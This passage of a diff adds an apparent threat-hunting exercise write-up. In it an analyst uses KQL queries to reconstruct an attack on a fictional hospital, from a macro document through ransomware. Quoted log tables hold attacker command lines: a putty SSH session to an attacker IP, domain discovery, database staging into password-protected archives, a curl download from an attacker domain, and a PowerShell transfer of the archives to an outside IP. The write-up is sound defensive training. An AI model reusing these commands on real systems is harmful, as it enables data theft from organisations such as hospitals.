+and timestamp >= datetime(2024-03-04 11:28:18.0000)
+and process_commandline !contains "SystemApps"
+and process_commandline !contains "WindowsApps"
+and process_commandline !contains "Edge"
+and process_commandline !contains "Teams"</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <caption>This table has been redacted; it only shows the most relevant findings, rather than the entire output of the KQL query above.</caption>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>parent_process_name</th>
+                    <th>parent_process_hash</th>
+                    <th>process_commandline</th>
+                    <th>process_name</th>
+                    <th>process_hash</th>
+                    <th>hostname</th>
+                    <th>username</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-03-04 11:29:21.0000</td>
+                    <td>Explorer.exe</td>
+                    <td>55df41f4f034802c82b219ecc3e3339b518a4dd1ea50371b8eb8de0daa6ef354</td>
+                    <td>Explorer.exe "C:\Users\rotrenneman\Downloads\New_Healthcare_Protocols.docm"</td>
+                    <td>Explorer.exe</td>
+                    <td>e8f6a9348ea4743447d103eff057f35cb3485456c5b67f9934683d3dd386027e</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-04 11:29:22.0000</td>
+                    <td>Explorer.exe</td>
+                    <td>088bd1b9347628a59b3b6537becede6519bc3b03e419cea5923754022f2b60ed</td>
+                    <td>C:\ProgramData\Heartburn\heartburn.zip</td>
+                    <td>heartburn.zip</td>
+                    <td>2849083eaa125abb7b4470fc0a7f7b750d37dd9e8b20072c2498a14117d61de3</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-04 13:15:22.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>cmd.exe /c Expand-Archive -Path C: \ProgramData\heartburn.zip -DestinationPath C:\ProgramData\Heartburn</td>
+                    <td>cmd.exe</td>
+                    <td>77fe1648d77984e988057b0d63301992addaa99970d0a7a92a9d522838f61b0c</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-04 14:42:22.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>cmd.exe /c C:\ProgramData\Heartburn\putty.exe -ssh 93.142.203.80 -l have_ya_tried -pw turning_it_off_and_on_again</td>
+                    <td>cmd.exe</td>
+                    <td>f55450e9502d007a5d594963452d93f9872aa5d082b5ec362a64c2be4b8b9941</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-05 14:39:49.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>whoami</td>
+                    <td>cmd.exe</td>
+                    <td>6ad6e6583a2a2d83067c4bf6d5d203ac6967496b52098acfa12f00751d01a602</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-05 15:32:49.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>net user /domain</td>
+                    <td>cmd.exe</td>
+                    <td>fa9ef7377baf4f016e065a0a8d46bc1622b9ab812c2a0f717e0249e941e6b60a</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-05 15:49:49.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>net group "domain computers" /domain</td>
+                    <td>cmd.exe</td>
+                    <td>e44cab19d18614698466a708dbd792bd3e86d6624cd7bb55a6e8df32a9ea0c9f</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-05 15:53:49.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>net group "domain admins" /domain</td>
+                    <td>cmd.exe</td>
+                    <td>eac4215395c4df12f023c7ae26a50daed98161285e19c78258064e1e936eae0f</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                  </tr>
+                  <tr>
+                    <td>2024-03-05 16:17:49.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>net localgroup administrators</td>
+                    <td>cmd.exe</td>
+                    <td>f48c129660214478c54f068ad6be33bdb136d98a826f919f11c70ad40111f3eb</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                  </tr>
+                  <tr>
+                    <td>2024-04-01 15:26:23.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>dbhunter.exe --search --filetype .db .sql .mdb --output C:\\In\\found_databases.txt</td>
+                    <td>dbhunter.exe</td>
+                    <td>191fd9ea5f7a66b56c8ba06aa19ba75e85c01bd377eb68b019a1bef20a8fbd36</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                  </tr>
+                  <tr>
+                    <td>2024-04-01 15:33:23.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>for /f %i in (C:\\In\\found_databases.txt) do copy %i C:\\Out\\</td>
+                    <td>cmd.exe</td>
+                    <td>18915f7dbcf0fdf0c4850c3f3c6dfaeee86ee2308a336971e64041e016d46b15</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                  </tr>
+                  <tr>
+                    <td>2024-04-01 16:05:36.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>7z.exe a -t7z C:\\Out\\Financial_Records.7z C:\\Out\\*financial*.db -p finnaberich</td>
+                    <td>cmd.exe</td>
+                    <td>e1973f0e63aa68e81e20dc0a4b39f2d41c9762c5b0f74acd2a765c1c606f1208</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                  </tr>
+                  <tr>
+                    <td>2024-04-01 16:23:36.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>7z.exe a -t7z C:\\Out\\Patient_Records.7z C:\\Out\\*patient*.sql -p i<3mulah</td>
+                    <td>cmd.exe</td>
+                    <td>b590e0b702031683099aba6fd6d39887083f67a7b4d54fd3df07001abcd7ccf7</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                  </tr>
+                  <tr>
+                    <td>2024-04-01 17:12:36.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>7z.exe a -t7z C:\\Out\\Roys_Meme_Collection.7z C:\\Out\\*meme*.mdb -p mommawemadeit</td>
+                    <td>cmd.exe</td>
+                    <td>ca5bf21d9e885b0811bd066559a3a82299c6eb311cd998b5e984cf15e40570fb</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                  </tr>
+                  <tr>
+                    <td>2024-04-01 17:35:22.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>curl.exe -o C:\ProgramData\Heartburn\anydesk_automation.ps1 https://unhealthyrecordsystems.tech/anydesk_automation.ps1</td>
+                    <td>cmd.exe</td>
+                    <td>a95d3d52df491df12c3e306b6f8ef1d1467de8659f71b2b8f4963f1cd29d9a1e</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                  </tr>
+                  <tr>
+                    <td>2024-04-02 11:21:00.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>powershell -File C:\ProgramData\Heartburn\anydesk_automation.ps1 -TargetIP 198.206.213.188 -Password 'thxfodacaviar' -FileToTransfer 'C:\Out\*'</td>
+                    <td>powershell.exe</td>
+                    <td>eee68e534cebefaa42debb31046c7bce4cd229612ab376c5951cf78513031bfa</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                  </tr>
+                  <tr>
+                    <td>2024-04-02 11:31:47.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>cmd.exe /c C:\\Windows\\Temp\\UrTottalyPwned.bat</td>
+                    <td>cmd.exe</td>
+                    <td>8dd091f8cb572ab649a1678db2d683cfd26520f1b02dc51589a8a8fc385a2fff</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                  </tr>
+                  <tr>
+                    <td>2024-04-02 11:53:57.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>cmd.exe /c reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d 'C:\Users\Public\ItWentWrong.jpg' /f && reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System' /v Wallpaper /t REG_SZ /d 'C:\Users\Public\ItWentWrong.jpg' /f</td>
+                    <td>cmd.exe</td>
+                    <td>cc59d11d08489135071b8070da3b3048511c5b76c249c284e2cc494e054afa86</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                  </tr>
+                  <tr>
+                    <td>2024-04-02 12:44:57.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>cmd.exe /c reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop' /v NoChangingWallPaper /t REG_SZ /d 1 /f && reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop' /v NoChangingWallPaper /t REG_SZ /d 1 /f</td>
+                    <td>cmd.exe</td>
+                    <td>2f0a4a732f33a62b87a3008bc71de6bfec739763a23b031d5119d3a2300b5ad9</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>After Roy opened the macro-enabled Microsoft Word document (<samp>.docm</samp>), it dropped an archive named <samp>heartburn.zip</samp>, which is decompressed to a dedicated folder <samp>Heartburn</samp> in the target's <samp>ProgramData</samp> directory; <samp>putty.exe</samp> is executed and used to establish a SSH (Secure Shell) connection to an attacker-controlled server (in this case, IP address <samp>93.142.203.80</samp>, with the username <samp>have_ya_tried</samp> and the password <samp>turning_it_off_and_on_again</samp>). The threat actor now has hands-on-keyboard access to the Database Administartor's device, and starts executing a typical set of discovery commands:</p>
+          <ul>
+            <li><samp>whoami</samp>: <quote>Displays user, group and privileges information for the user who is currently logged on to the local system. If used without parameters, <samp>whoami</samp> displays the current domain and user name.</quote> [<a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami">Microsoft Learn</a>].</li>
+            <li><samp>net user /domain</samp>: Displays all users belonging to the domain. [<a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/net-user">Microsoft Learn</a>]</li>
+            <li><samp>net group "domain computers" /domain</samp>: Displays all users belonging to the group "domain computers" in the domain. [<a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc754051(v=ws.11)">Microsoft Learn</a>]</li>
+            <li><samp>net group "domain admins" /domain</samp>: Displays all users belonging to the group "domain admins" in the domain. [<a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc754051(v=ws.11)">Microsoft Learn</a>]</li>
+            <li><samp>net localgroup administrators</samp>: <quote>Used without additional parameters, <samp>**net localgroup &lt;**GroupName></samp> displays a list of users or global groups in a local group.</quote>. [<a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc725622(v=ws.11)">Microsoft Learn</a>]</li>
+          </ul>
+          <p><samp>dbhunter.exe</samp> is downloaded off the internet via Microsoft Edge (per <samp>FileCreationEvents</samp>) and executed to dump a list of all found databases as a plain text file on a staging folder. They use this list to programmatically copy, compress and encrypt sensitive data (such as financial records, patient records, and Roy's meme collection) off the database(s) located in Roy's device (which doubles as the hospital's server). The archives are: <samp>Financial_Records.7z</samp> (password: </samp>finnaberich</samp>), <samp>Patient_Records.7z</samp> (password: </samp>i&lt;3mulah</samp>) and <samp>Roys_Meme_Collection.7z</samp> (password: </samp>mommawemadeit</samp>). The threat actor then uses cURL to download the PowerShell script <samp>anydesk_automation.ps1</samp> off their server (<samp>unhealthyrecordsystems.tech</samp>). This script is run and used to connect to IP address <samp>198.206.213.188</samp> with the password <samp>thxfodacaviar</samp> and exfiltrate all previously created <samp>.7z</samp> archives.</p>
+          <p>Finally, they execute <samp>UrTotallyPwned.bat</samp>--downloaded at some point by the threat actor; there are no emails or other signs that Roy navigated to the download on their own--and replace all hospital computer's desktop wallpapers with a taunting image, and further disabled the ability to manually change it back.</p>
+          <p>I'll backtrack a bit and look for signs of the threat actor's recon efforts against Azure Crest in the next section.</p>
+        </section> <!--section 3-->
+        <section id="section4"><!--section 4-->
+          <h3>Section 4 - dERPy Database</h3>
+          <p>Repurposing my previous KQL queries, I use this to determine any threat actor activity in our website prior, during and after the attack:</p>
+          <pre><kbd>let bad_emails =
+Email
+| where subject =~ "[EXTERNAL] 👶 New! Revolutionary Pediatric Healthcare Strategies ✨"
+| distinct sender;
+let bad_domains =
+Email
+| where sender in (bad_emails)
+or reply_to in (bad_emails)
+| distinct tostring(parse_url(link).Host);
+Email
+| where tostring(parse_url(link).Host) in (bad_domains)
+| distinct tostring(parse_url(link).Host)
+| lookup PassiveDns on $left.Host == $right.domain
+| distinct ip
+| lookup InboundNetworkEvents on $left.ip == $right.src_ip
+| sort by timestamp asc</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <thead>
+                  <tr>
+                    <th>ip</th>
+                    <th>timestamp</th>
+                    <th>method</th>
+                    <th>user_agent</th>
+                    <th>url</th>
+                    <th>status_code</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>25.126.98.121</td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                    <td></td>
+                  </tr>
+                  <tr>
+                    <td>115.12.60.150</td>
+                    <td>2024-03-01 00:00:00.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=hospital+network+architecture</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>131.190.102.173</td>
+                    <td>2024-03-01 08:11:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=pediatric+department+internal+procedures</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>16.101.245.182</td>
+                    <td>2024-03-01 09:07:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=employee+contact+list</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>96.120.124.180</td>
+                    <td>2024-03-01 09:29:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=IT+security+protocols</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>135.103.59.74</td>
+                    <td>2024-03-01 10:23:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=How+many+money+does+Azure+Crest+Hospital+have%3F</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>62.121.133.43</td>
+                    <td>2024-03-01 10:59:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=Is+Azure+Crest+Hospital+loaded+with+cash%3F</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>93.142.203.80</td>
+                    <td>2024-03-01 11:05:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=Does+Azure+Crest+Hospital+have+a+lot+of+money%3F</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>135.103.59.74</td>
+                    <td>2024-03-01 11:16:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=Azure+crest+ERP+systems</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>131.190.102.173</td>
+                    <td>2024-03-01 11:51:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=Roy+Trenemman+Azure+Crest</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>115.12.60.150</td>
+                    <td>2024-03-01 12:08:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=Penny+Pincher+Azure+Crest</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>131.190.102.173</td>
+                    <td>2024-03-01 12:23:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=Azure+Crest+Hospital+financial+reports</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>16.101.245.182</td>
+                    <td>2024-03-01 12:35:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=Azure+Crest+Hospital+financial+statements</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>131.92.62.82</td>
+                    <td>2024-03-01 13:28:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=Azure+Crest+Hospital+financial+data</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>131.92.62.82</td>
+                    <td>2024-03-01 13:45:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=Azure+Crest+Hospital+financials</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>131.190.102.173</td>
+                    <td>2024-03-01 13:48:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=Azure+Crest+Hospital+Cyber+Security+team</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>115.12.60.150</td>
+                    <td>2024-03-01 14:43:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=Azure+Crest+Hospital+IT+Security+team</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>131.92.62.82</td>
+                    <td>2024-03-01 14:48:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=pediatric+patient+records</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>131.92.62.82</td>
+                    <td>2024-03-01 15:12:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=pediatric+patient+medical+history</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>131.190.102.173</td>
+                    <td>2024-03-01 15:37:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=pediatric+patient+medical+records</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>131.190.102.173</td>
+                    <td>2024-03-01 15:50:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=where+are+pediatric+patient+records+stored</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>115.12.60.150</td>
+                    <td>2024-03-01 16:01:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/search=how+to+access+pediatric+patient+records</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>115.12.60.150</td>
+                    <td>2024-03-01 16:28:22.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/internal_share/medical_records/pediatric</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>93.142.203.80</td>
+                    <td>2024-03-01 16:28:41.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/staff_directory/pediatric_department</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>135.103.59.74</td>
+                    <td>2024-03-01 16:28:50.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/IT_security_policies</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>93.142.203.80</td>
+                    <td>2024-03-01 16:29:14.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/news/penny-pincher-boasts-about-cost-cutting-on-it-department</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>115.12.60.150</td>
+                    <td>2024-03-01 16:30:03.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/news/half-of-it-department-fired</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>16.101.245.182</td>
+                    <td>2024-03-01 16:30:09.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/news/roy-trenemman-joins-azure-crest-to-save-money-on-erp-systems</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>93.142.203.80</td>
+                    <td>2024-03-01 16:30:21.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/news/research/roy-trenemman-invents-new-architecture-database-systems</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>115.12.60.150</td>
+                    <td>2024-03-01 16:30:26.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/news/research/why-running-your-own-erp-systems-is-a-good-idea</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>215.95.144.58</td>
+                    <td>2024-03-01 16:31:06.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/news/research/why-pay-for-expensive-erp-systems-when-you-can-run-your-own</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>115.12.60.150</td>
+                    <td>2024-03-01 16:31:56.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/news/research/how-azure-crest-is-revolutionizing-the-way-it-is-done</td>
+                    <td>200</td>
+                  </tr>
+                  <tr>
+                    <td>16.101.245.182</td>
+                    <td>2024-03-01 16:32:39.0000</td>
+                    <td>GET</td>
+                    <td>Opera/9.63.(Windows CE; lb-LU) Presto/2.9.161 Version/12.00</td>
+                    <td>https://azurecresthospital.med/news/research/run-your-own-erp-systems-on-sqlite-what-could-possibly-go-wrong</td>
+                    <td>200</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>Evidently, the threat actor did their research. Notably, out of all their IP addresses, only one didn't browse our webpage.</p>
+          <p>The information they looked for included (clumsily) the hospital's finances (esp. revenue and profits), the hospital's network architecture, IT protocols, employee contact information, IT staff and cybersecurity staff, and <i>information on the ERP system</i>, including on its designer, Database Administrator Roy Trenemman; the recent staff layoffs and other cost-cutting measures (that included the creation and implementation of an in-house ERP system); and information on the ERP system's design, such as technologies used (SQlite, among others). Most damning, the threat actors were looking for ways to access <i>pediatric</i> patient records.</p>
+          <p>Unfortunately, they did access the internal share containing these records (<samp>https://azurecresthospital.med/internal_share/medical_records/pediatric</samp>) on March 1st.</p>
+          <p>As mentioned, <samp>UrTotallyPwned.bat</samp> rendered the databases inaccessible. Perhaps <samp>FileCreationEvents</samp> has a hint; for example, if they were encrypted, and if so with what file extension, what hostnames could've been affected besides the server, etcetera.</p>
+          <pre><kbd>FileCreationEvents
+| where timestamp >= datetime(2024-04-02 11:31:47.0000) //when the Batch script was executed</kbd></pre>
+          <details open id="results1">
+            <summary>Query Results</summary>
+            <div class="table-container">
+              <table>
+                <caption>This table has been redacted; it only shows the most relevant findings, rather than the entire output of the KQL query above.</caption>
+                <thead>
+                  <tr>
+                    <th>timestamp</th>
+                    <th>hostname</th>
+                    <th>username</th>
+                    <th>sha256</th>
+                    <th>path</th>
+                    <th>filename</th>
+                    <th>process_name</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td>2024-04-02 11:32:29.0000</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                    <td>3b8daeb7c5307430f836c6ca58b432828ea58dcc8b6dd953f12e6eeeb8e86c29</td>
+                    <td>C:\System\Database\hospital_scheduling.db.scholopendra</td>
+                    <td>hospital_scheduling.db.scholopendra</td>
+                    <td>explorer.exe</td>
+                  </tr>
+                  <tr>
+                    <td>2024-04-02 11:32:48.0000</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                    <td>c551a57313e279dada8f0d580f6cbbff68820f0bcd22115b8872f92257048ada</td>
+                    <td>C:\System\Database\financial_data.db.scholopendra</td>
+                    <td>financial_data.db.scholopendra</td>
+                    <td>explorer.exe</td>
+                  </tr>
+                  <tr>
+                    <td>2024-04-02 11:32:49.0000</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                    <td>d4651af07de3c464181de6c0c1f39a27f279eaf342596b2ae067aca964eaf364</td>
+                    <td>C:\System\Database\employee_info.db.scholopendra</td>
+                    <td>employee_info.db.scholopendra</td>
+                    <td>explorer.exe</td>
+                  </tr>
+                  <tr>
+                    <td>2024-04-02 11:32:52.0000</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                    <td>a1aa6bccae477706d0f47c2302bd8183c86fb39a158f8e804fee97a291ee3b02</td>
+                    <td>C:\System\Database\pediatric_patient_data.db.scholopendra</td>
+                    <td>pediatric_patient_data.db.scholopendra</td>
+                    <td>explorer.exe</td>
+                  </tr>
+                  <tr>
+                    <td>2024-04-02 11:33:14.0000</td>
+                    <td>SUPER-DB-SERVER-9000</td>
+                    <td>rotrenneman</td>
+                    <td>efbdda5c9a85317cae21333e09f2f622a5b14ebe8b7c5d80aca306f4957f953d</td>
+                    <td>C:\System\Database\research_data.db.scholopendra</td>
+                    <td>research_data.db.scholopendra</td>
+                    <td>explorer.exe</td>
+                  </tr>
+                  <tr>
